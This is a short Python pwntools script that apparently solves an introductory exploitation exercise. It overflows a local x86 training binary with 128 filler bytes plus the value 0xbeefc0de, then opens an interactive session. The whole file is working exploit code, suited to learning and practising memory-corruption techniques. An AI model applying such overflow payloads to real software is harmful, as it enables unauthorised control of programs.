#!/usr/bin/python

import struct
import sys

from pwn import *

context(arch='x86', os='linux', endian='little', word_size=32)

binary_path = './bin/x86/01-local-overflow'

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * 128
payload += p32(0xbeefc0de)

p.readuntil('> ')
p.write(payload)
p.interactive()
